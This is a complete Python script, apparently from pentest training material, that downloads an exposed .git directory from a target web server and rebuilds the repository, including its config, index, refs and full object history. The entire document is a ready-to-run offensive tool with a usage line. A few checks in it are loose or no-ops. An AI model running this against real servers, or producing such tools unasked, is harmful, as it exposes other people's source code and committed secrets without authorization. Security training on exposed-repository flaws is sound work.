#!/usr/bin/env python3
"""git-dumper — stdlib-only .git rebuilder for exposed repos (PenTRAIN).

Usage: git-dumper http://TARGET/.git/ outdir
Fetches refs + HEAD, then walks loose objects via zlib inflation
(commit → tree → blobs). Works with and without autoindex listings —
the object walk only needs the ref, never a directory listing.
Reconstructs refs/HEAD so `git -C outdir log -p` works afterwards.
"""
import os
import re
import sys
import urllib.request
import zlib

UA = {"User-Agent": "git-dumper/1.0"}


def fetch(url):
    req = urllib.request.Request(url, headers=UA)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            if r.status != 200:
                return None
            body = r.read()
            # Apache ErrorDocument can return an HTML 404 page with 200 —
            # never mistake it for git content
            if body.lstrip()[:15].lower().startswith((b"<!doctype", b"<html")):
                return None
            return body
    except Exception:
        return None


def sha_path(sha):
    return "objects/%s/%s" % (sha[:2], sha[2:])


def obj_refs(data):
    """Referenced shas inside an inflated loose object (commit/tree)."""
    refs = set()
    # commit: 'tree <sha>' + 'parent <sha>' lines live in the header block
    header = data.split(b"\x00", 1)[-1].split(b"\n\n", 1)[0]
    for m in re.finditer(rb"^(?:tree|parent) ([0-9a-f]{40})$", header, re.M):
        refs.add(m.group(1).decode())
    # tree entries: 'mode name\x00<20-byte sha>'
    for m in re.finditer(rb"\d+ [^\x00]+\x00(.{20})", data, re.S):
        refs.add(m.group(1).hex())
    return refs


def main():
    if len(sys.argv) != 3:
        sys.exit("usage: git-dumper http://TARGET/.git/ outdir")
    base, out = sys.argv[1].rstrip("/"), sys.argv[2]
    os.makedirs(out, exist_ok=True)
    os.chdir(out)

    seen = set()

    def get(path, dest=None):
        data = fetch("%s/%s" % (base, path))
        if data is None:
            print("[-] miss %s" % path)
            return None
        dest = dest or path
        os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
        with open(dest, "wb") as f:
            f.write(data)
        print("[+] %s (%d bytes)" % (path, len(data)))
        return data

    # top-level files + refs
    get("HEAD")
    get("packed-refs")
    get("config")
    get("index")
    for ref in ("refs/heads/master", "refs/heads/main"):
        if get(ref):
            head = re.search(rb"[0-9a-f]{40}", open(ref, "rb").read())
            if head:
                seen.add(head.group(0).decode())
            break

    # HEAD → detached or symref fallback
    if not seen and os.path.isfile("HEAD"):
        h = open("HEAD").read()
        m = re.search(r"ref: (refs/\S+)", h) or re.search(r"[0-9a-f]{40}", h)
        if m:
            ref = m.group(1) if m.lastindex else None
            if ref:
                data = get(ref)
                if data:
                    seen.add(data[:40].decode().strip())
            else:
                seen.add(m.group(0))

    # packed-refs seeds
    if os.path.isfile("packed-refs"):
        for sha in re.findall(rb"^[0-9a-f]{40}", open("packed-refs", "rb").read(), re.M):
            seen.add(sha.decode())

    # object walk
    queue = list(seen)
    while queue:
        sha = queue.pop()
        if sha in seen and sha not in queue:
            pass
        path = sha_path(sha)
        if os.path.isfile(path):
            continue
        data = get(path)
        if data is None:
            continue
        try:
            refs = obj_refs(zlib.decompress(data))
        except Exception:
            continue
        for r in refs:
            if r not in seen:
                seen.add(r)
                queue.append(r)

    print("[*] done — %d objects; try: git -C %s log -p / checkout -- ." % (len(seen), out))


if __name__ == "__main__":
    main()
